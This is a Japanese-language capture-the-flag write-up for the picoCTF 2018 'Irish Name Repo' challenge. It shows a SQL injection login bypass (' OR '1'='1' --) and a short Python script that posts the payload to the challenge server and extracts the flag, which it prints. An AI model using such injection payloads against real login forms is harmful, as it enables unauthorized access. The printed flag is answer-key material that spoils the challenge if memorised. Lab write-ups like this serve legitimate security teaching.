# Irish Name Repo

## Solve
```
There is a website running at http://2018shell.picoctf.com:59464 (link). 
Do you think you can log us in? 
Try to see if you can login!
```

## Hint
```
There doesn't seem to be many ways to interact with this, I wonder if the users are kept in a database?
```

<br>


## Solution

![1](https://user-images.githubusercontent.com/47602064/83484447-eda69100-a4df-11ea-84bf-44da432bf611.png)

問題に移動すると何かのサイトが表示されました。

左上のボタンと押すと他のページがあることがわかります。

試しに`Support`ページに移動すると以下が表示されました。

![2](https://user-images.githubusercontent.com/47602064/83581447-c9978e00-a579-11ea-9a8f-9d8b4de2b29c.png)

```txt
Cannot add name
Hi. I tried adding my favorite Irish person, Conan O'Brien. But I keep getting something called a SQL Error
That's because Conan O'Brien is American.
Admin
```

以上のコメントよりloginページではSQLが使われていることが考えられます。

<br>

次に`Admin Login`ページに移動するとユーザー名とパスワードの入力欄があります。

![3](https://user-images.githubusercontent.com/47602064/83581498-efbd2e00-a579-11ea-859d-c05dc2d80a0b.png)


単純にSQLiをしてみます。

ユーザー名に`' OR '1'='1' --`と入力すると以下のように表示されました。

![4](https://user-images.githubusercontent.com/47602064/83581599-3f035e80-a57a-11ea-8282-b5212db25594.png)

`Your flag is: picoCTF{con4n_r3411y_1snt_1r1sh_d121ca0b}`

するとflagが表示されました。

<br>

Pythonでflagを得る場合は以下のようなプログラムで綺麗にflagを得ることが出来ます。

```python
#!/usr/bin/python

import requests
import re

params = {'username': "' OR 1=1 --", 'password': '', 'debug': 0}

r = requests.post('http://2018shell1.picoctf.com:59464/login.php', data=params)
source = r.text
print re.findall(r'(picoCTF\{.+\})', source)[0]
```

<br><br>

## FLAG: picoCTF{con4n_r3411y_1snt_1r1sh_d121ca0b}
